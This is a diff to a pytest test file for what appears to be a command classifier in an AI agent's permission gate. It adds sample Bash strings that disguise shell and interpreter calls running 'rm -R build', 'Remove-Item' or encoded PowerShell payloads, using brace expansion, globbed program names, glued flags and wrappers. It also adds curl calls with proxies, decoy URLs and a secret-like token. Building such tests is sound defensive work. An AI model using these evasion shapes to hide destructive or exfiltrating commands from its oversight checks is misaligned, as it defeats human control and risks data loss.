@@ -109,6 +109,14 @@ def test_E02_an_estopped_request_is_recorded_as_held(x):
     ('Bash', 'curl https://api2.example/x', ('web', 'api2.example')),
     ('Bash', 'curl https://abcdefghijklmnopqrstuvwxyz.example/x', ('web', '….example')),
     ('Bash', 'curl https://ab_cd.example/x', ('web', 'curl')),
+    # round 5: a dotless host, a token-shaped TLD and an all-digit label are not plain letters
+    ('Bash', 'curl https://Ab3dEf9hIjK2LmN4OpQ7/x', ('web', '…')),
+    ('Bash', 'curl https://h.example.sk3Kd9fLq2mZ8xRv7wT1/x', ('web', 'h.example.…')),
+    ('Bash', 'curl https://482913756.example/x', ('web', '….example')),
+    # round 5: a proxy URL, or a URL after a flag that may take a value, is not the target
+    ('Bash', 'curl --socks5 http://u:pw9Kd2@p.example:1080 h.example/x', ('web', 'curl')),
+    ('Bash', 'curl --proxy-header http://decoy.example h.example/x', ('web', 'curl')),
+    ('Bash', 'curl -v https://h.example/x', ('web', 'h.example')),
     ('Bash', 'curl --proxy-header http://decoy.example https://h.example/x', ('web', 'curl')),
     ('Bash', 'curl --pass hunter2.x https://h.example/x', ('web', 'h.example')),
     ('Bash', 'curl -H "Referer: https://evil.example/x" https://h.example/x', ('web', 'h.example')),
@@ -204,6 +212,12 @@ HOSTILE = [
     ('Bash', 'curl https://hunter2.example/x'),
     ('Bash', 'curl https://api.hunter2.example/x'),
     ('Bash', 'curl https://api.hunter2_x/x'),
+    ('Bash', 'curl https://hunter2/x'),
+    ('Bash', 'curl https://api.example.hunter2/x'),
+    ('Bash', '{bash,-c,"echo hunter2"}'),
+    ('Bash', 'bash {-c,"echo hunter2"}'),
+    ('Bash', 'pwsh -cRemove-Item hunter2.x'),
+    ('Bash', 'bash -o pipefail -c"echo hunter2"'),
     ('Bash', 'curl --proxy-header http://decoy.example/hunter2 https://h.example/x'),
 ]
 
@@ -302,6 +316,21 @@ def test_E06_the_chip_names_the_action_that_decided_the_answer(x):
     r'C:\Windows\System32\cmd.exe /c"rm -R build"', 'perl -lne 1', 'bash -File x.sh',
     'sh -C x.sh', 'powershell -NoProfile -Command x', 'powershell -ENC"cm0g=="',
     'python x.py -c "print(1)"',
+    # round 5: a value option before the code does not end the scan, a glued PowerShell short
+    # form is code, a brace or glob program or argument is not known, and a subshell, a negation,
+    # a find -exec and the wrappers run what they are given
+    'bash -o pipefail -c"rm -R build"', 'bash -o errexit -c"rm -R build"',
+    'bash --rcfile x -c"curl https://h.example/x"', 'python -X utf8 -c"import os"',
+    'python -W ignore -c"import os"', 'node -r ts-node/register -e"require(1)"',
+    'node -r ts-node/register -p"1"', 'php -d x=1 -r"echo 1;"',
+    'powershell -c"Remove-Item x"', 'powershell -C"Remove-Item x"', 'powershell -E"Remove-Item x"',
+    'powershell -EC"cm0g=="', 'pwsh -EC"cm0g=="', 'pwsh -ECcm0g==', 'pwsh -cRemove-Item x',
+    'powershell -NoProfile -EC"cm0g=="', '{bash,-c,"rm -R build"}', '{python,-c,"import os"}',
+    'b?sh -c"rm -R build"', 'b*sh -lc "rm -R build"', '/usr/bin/b[a]sh -c "rm -R build"',
+    'bash {-c,"rm -R build"}', '(rm -R build)', '! rm -R build',
+    "find . -exec sh -c 'curl https://h.example/x' +", 'setarch x86_64 bash -c"x"',
+    'doas bash -c"x"', 'chroot . bash -c"x"', 'script -qc"x" /dev/null', 'parallel bash -c ::: x',
+    'node server.js -p 3000', 'python script.py -Ec x', 'node server.js -c x', 'perl script.pl -c x',
 ])
 def test_E07_wrappers_and_payload_flags_are_unclassified(cmd, tmp_path):
     """A shell or interpreter running a payload, or a wrapper that runs another
@@ -312,13 +341,19 @@ def test_E07_wrappers_and_payload_flags_are_unclassified(cmd, tmp_path):
 
 @pytest.mark.parametrize('cmd', [
     'node -r ts-node/register x.ts', 'py -E x.py', 'python -E x.py', 'python -P x.py',
-    'python -m pytest -q',
-    'node --version', 'node server.js -p 3000', 'python script.py -Ec x',
+    'python -m pytest -q', 'node --version',
 ])
 def test_E11_the_rules_leave_these_as_plain_exec(cmd, tmp_path):
     """The shapes the rule does not name stay what the first build made them: a plain exec."""
     acts, unclassified = canonical.canonicalise('Bash', cmd, {'workdir': str(tmp_path)})
     assert unclassified is False and acts[0].action_class == 'exec', (cmd, acts)
+
+
+@pytest.mark.parametrize('cmd', ['ls *.py', 'cat *.md'])
+def test_E12_a_glob_on_a_read_command_stays_a_read(cmd, tmp_path):
+    """The glob rule holds shells, interpreters and wrappers, not a read: `ls *.py` is a read."""
+    acts, unclassified = canonical.canonicalise('Bash', cmd, {'workdir': str(tmp_path)})
+    assert unclassified is False and acts[0].action_class == 'read', (cmd, acts)
 
 
 def test_gate_classifier_block_matches_the_code():
